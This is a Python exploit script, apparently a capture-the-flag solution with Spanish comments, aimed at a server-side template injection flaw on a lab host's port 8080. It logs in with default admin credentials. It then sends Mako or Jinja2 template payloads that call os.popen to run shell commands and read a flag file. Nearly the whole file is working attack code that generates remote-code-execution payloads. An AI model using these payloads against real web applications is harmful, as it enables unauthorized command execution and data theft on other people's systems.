import httpx
import asyncio
from typing import ClassVar, Dict, Optional, Callable
from pydantic import BaseModel, SecretStr
from getpass import getpass

class AuthCredentials(BaseModel):
    """Encapsulamiento de credenciales con validación."""
    username: str
    password: SecretStr # Seguridad ante todo, nada de imprimirlo en logs

class ChallengeArchitect:
    """
    Arquitectura Senior para la explotación del puerto 8080.
    Utiliza Closures para generar payloads dinámicos.
    """
    def __init__(self, target_url: str):
        self.url: str = target_url
        self.client = httpx.AsyncClient(follow_redirects=True)

    async def __aenter__(self): return self
    async def __aexit__(self, *args): await self.client.aclose()

    def payload_factory(self, engine_type: str) -> Callable[[str], str]:
        """
        Closure para encapsular la lógica de generación de payloads.
        Priorizamos Mako por lo visto en el puerto 8080.
        """
        def generator(command: str) -> str:
            if engine_type == "mako":
                return f"${{__import__('os').popen('{command}').read()}}"
            return f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{command}').read() }}}}"
        return generator

    async def pwn_challenge(self, creds: AuthCredentials):
        """Lógica de autenticación y explotación."""
        # Paso 1: Login (Asegúrate de que los campos coincidan con el HTML)
        login_data = {"username": creds.username, "password": creds.password.get_secret_value()}
        resp = await self.client.post(f"{self.url}/login", data=login_data)
        
        if "Welcome" in resp.text or resp.status_code == 200:
            print("[+] Acceso concedido al nivel superior.")
            # Paso 2: Ejecución (Usando el closure)
            make_payload = self.payload_factory("mako")
            cmd = "cat 7f58571b42d8c477a2f3efa69a681ac3.txt" # El hash que ya conoces
            
            final_resp = await self.client.post(f"{self.url}/profile", data={"name": make_payload(cmd)})
            print(f"[*] Botín extraído: {final_resp.text}")
        else:
            print("[-] El portero no te deja pasar. Revisa los credenciales.")

async def run_exploit():
    print("--- SSTI Professional Suite ---")
    user = input("Introduce usuario [admin]: ") or "admin"
    pwd = getpass("Introduce password [admin]: ") or "admin"
    
    creds = AuthCredentials(username=user, password=SecretStr(pwd))
    
    async with ChallengeArchitect("http://10.64.136.103:8080") as architect:
        await architect.pwn_challenge(creds)

if __name__ == "__main__":
    asyncio.run(run_exploit())